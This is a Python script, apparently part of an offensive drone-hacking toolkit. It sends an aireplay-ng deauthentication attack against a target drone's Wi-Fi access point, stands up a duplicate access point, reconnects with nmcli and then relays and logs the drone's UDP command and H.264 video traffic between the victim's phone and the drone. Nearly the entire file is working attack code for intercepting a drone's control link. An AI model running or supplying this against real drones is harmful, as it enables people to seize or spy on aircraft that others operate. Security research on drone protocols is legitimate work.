import json
import os
import sys
import time
import socket
import threading
# import hijack
from protocol import parse_packet
import subprocess
try:
    from src.utils import sudo_exec
except ImportError:
    try:
        from utils import sudo_exec
    except ImportError:
        def sudo_exec(cmd):
            """Fallback sudo_exec if utils module is not found"""
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
            return result

##################
### PREP MODULE ##
##################

# Get path to project root directory (two levels up from this file)
target_data_file = os.path.join(os.path.dirname(__file__), '..', '..', "data", "module_input_data.json")
scan_info = None

# Intialize target drone data
with open(target_data_file, 'r') as file:
    scan_info = json.load(file)

target_info = scan_info.get("target_info", {})
target_mac = target_info.get("mac_address")
target_channel = target_info.get("channel")
target_ssid = target_info.get("raw_string")

options_info = scan_info.get("options", {})
packets = options_info.get("packets")
interface = options_info.get("interface")

# ── Config ────────────────────────────────────────────────────────────────────
AP_INTERFACE       = "wlx9cefd5f754df"
AP_INTERFACE_IP    = "192.168.10.1"   # Card 1 AP IP (phone side)
LISTEN_PORT        = 8889             # Command port phone sends to
AP_VIDEO_PORT      = 62512             # Video stream port (phone side)

DRONE_INTERFACE    = "wlx9cefd5f66998"
DRONE_INTERFACE_IP = ""
DRONE_HOST         = "192.168.10.1"   # Real drone IP
DRONE_PORT         = 8889             # Drone command port

DRONE_VIDEO_PORT   = 7797            # Drone → client video stream

SO_BINDTODEVICE    = 25
# ─────────────────────────────────────────────────────────────────────────────

phone_addr       = None
phone_lock       = threading.Lock()

sudo_exec("pwd")
sudo_exec(f"./SetupAP.sh {AP_INTERFACE}")

# Hijacking stuff

def deauth(interface, target_mac, target_channel, packets, target_ssid):
    try:
        # Put interface into monitor mode first
        sudo_exec(f"ifconfig {interface} down")
        sudo_exec(f"iwconfig {interface} mode monitor")
        sudo_exec(f"ifconfig {interface} up")

        # Targeting specific channel of target drone
        sudo_exec(f"iwconfig {interface} channel {target_channel}")

        # Deauth attack command

        # aireplay-ng
        # -0 : Deauth attack
        # packets : Number of deauth packets to send
        # -a : Target BSSID (MAC address)
        # target_mac : Target BSSID (MAC) from input file
        # interface : Network interface to use

        sudo_exec(f"aireplay-ng -0 {packets} -a {target_mac} {interface}")

        return
        
    except Exception as e:
        print(f"ERROR: On-Path module failed: {e}")
        sys.exit(1)

def reauth(target_ssid, target_mac, interface):
    try:
        # Reauth attack cmd - connect to the target network via its SSID
        print(f"[*] Attempting to connect to network '{target_ssid}'...")
        
        # First, try to start NetworkManager if it's not running
        print("[*] Ensuring NetworkManager is running...")
        nm_status = subprocess.run("systemctl is-active --quiet NetworkManager", shell=True)
        if nm_status.returncode != 0:
            print("[*] Starting NetworkManager...")
            result = sudo_exec("systemctl start NetworkManager")
            if result.returncode != 0:
                print("WARNING: Could not start NetworkManager")
            time.sleep(2)
        
        # nmcli dev wifi connect <SSID> ifname <interface>
        # For open networks (no password required)
        result = sudo_exec(f"nmcli dev wifi connect '{target_ssid}' bssid {target_mac} ifname {interface}")
        
        if result.returncode != 0:
            print(f"ERROR: nmcli connection failed with return code {result.returncode}")
            print("Connection attempt failed. Possible causes:")
            print(f"1. Network '{target_ssid}' is not in range")
            print("2. Network requires a password (open network assumed)")
            print("3. NetworkManager is not available")
            print("4. Interface is not available")
            sys.exit(1)
        
        print("[+] Successfully connected to target network!")
        
        # Wait a moment for the connection to stabilize
        time.sleep(2)
        
        # Unsure
        return
        
    except Exception as e:
        print(f"ERROR: On-Path module failed: {e}")
        sys.exit(1)

def hijack(interface, target_mac, target_channel, packets, target_ssid):
    try:
        # Setup the duplicate AP
        sudo_exec(f"../modules/onpath/SetupAP.sh {interface}")

        # Deauth
        deauth(interface, target_mac, target_channel, packets, target_ssid)

        # Start the duplicate AP
        sudo_exec(f"../modules/onpath/StartAP.sh {interface}")

        # Reauth
        reauth(target_ssid, target_mac, interface)

        # Exit, return to the relay module
        sys.exit(0)
        
    except Exception as e:
        print(f"ERROR: Reauth module failed: {e}")
        sys.exit(1)

# Run the hijack program to deauth, set up the duplcate AP, and connect to the target network
hijack(interface, target_mac, target_channel, 7, target_ssid)

# ── Phone-side command socket (card 1, port 8889) ────────────────────────────
phone_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
phone_sock.setsockopt(socket.SOL_SOCKET, SO_BINDTODEVICE, AP_INTERFACE.encode('utf-8') + b'\0')
phone_sock.bind((AP_INTERFACE_IP, LISTEN_PORT))


# ── Drone-side command socket (card 2, fixed src port 8889) ──────────────────
drone_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
drone_sock.setsockopt(socket.SOL_SOCKET, SO_BINDTODEVICE, DRONE_INTERFACE.encode('utf-8') + b'\0')
drone_sock.connect(("0.0.0.0", LISTEN_PORT))


# ── Drone-side video socket (card 2, port 7797) ─────────────────────────────
video_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
video_sock.setsockopt(socket.SOL_SOCKET, SO_BINDTODEVICE,
                      DRONE_INTERFACE.encode() + b'\0')
video_sock.bind(("0.0.0.0", DRONE_VIDEO_PORT))

# Phone-side video socket — deliver stream back to phone on 7797
phone_video_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
phone_video_sock.setsockopt(socket.SOL_SOCKET, SO_BINDTODEVICE,
                             AP_INTERFACE.encode() + b'\0')
phone_video_sock.bind((AP_INTERFACE_IP, AP_VIDEO_PORT))


# ── Thread functions ──────────────────────────────────────────────────────────

def phone_to_drone(): 
    """Forward packets from phone -> drone, track phones IP dynamically"""
    global phone_addr
    while True:
        data, addr = phone_sock.recvfrom(4096)
        with phone_lock:
            if phone_addr != addr:
                print(f"[INFO] Phone address updated: {addr}")
                phone_addr = addr # ---> This is where we are updating the phone IP everytime there is a com

        parsed = parse_packet(data) #display the command sent using the parse_packet function
        if parsed["type"] == "binary":
            print(f"[P->D] {addr} | {len(data)} bytes | {parsed['cmd_name']} (seq={parsed['seq_id']}) | {data.hex()}")
        else:
            print(f"[P->D] {addr} | {len(data)} bytes | TEXT: {parsed['raw']}")

        drone_sock.sendto(data, (DRONE_HOST, DRONE_PORT)) #pass it unchanged to the drone 


def drone_to_phone(): 
    """Forward packets from drone -> phone, drop if phone hasnt connected yet"""
    while True: 
        data, addr = drone_sock.recvfrom(4096)

        parsed = parse_packet(data) #display the command sent using the parse_packet function
        if parsed["type"] == "binary":
            print(f"[P<-D] {addr} | {len(data)} bytes | {parsed['cmd_name']} (seq={parsed['seq_id']}) | {data.hex()}")
        else:
            print(f"[P<-D] {addr} | {len(data)} bytes | TEXT: {parsed['raw']}")
            
        with phone_lock: 
            target = phone_addr 
        if target is None:
            print("[WARN] Drone sent data but no phone connected yet, dropping")
            continue 
        phone_sock.sendto(data, target) #pass unchanged 

def drone_video_to_phone():
    """Forward H.264 video stream drone → phone."""
    while True:
        data, addr = video_sock.recvfrom(65536)   # larger buffer for video
        with phone_lock:
            target = phone_addr
        if target is None:
            continue
        phone_video_sock.sendto(data, (target[0], DRONE_VIDEO_PORT))
        # Video is high-bandwidth — skip per-packet logging

# ── Start threads ─────────────────────────────────────────────────────────────

# Starts both functions at the same time on separate threads
threading.Thread(target=phone_to_drone, daemon=True).start()
threading.Thread(target=drone_to_phone, daemon=True).start()
threading.Thread(target=drone_video_to_phone, daemon=True).start()

print(f"Relay Listening on {AP_INTERFACE_IP}:{LISTEN_PORT}")
print(f"Forwarding to drone at {DRONE_HOST}:{DRONE_PORT}")
print(f"Forwarding video to phone on {AP_INTERFACE_IP}:{AP_VIDEO_PORT}")
threading.Event().wait()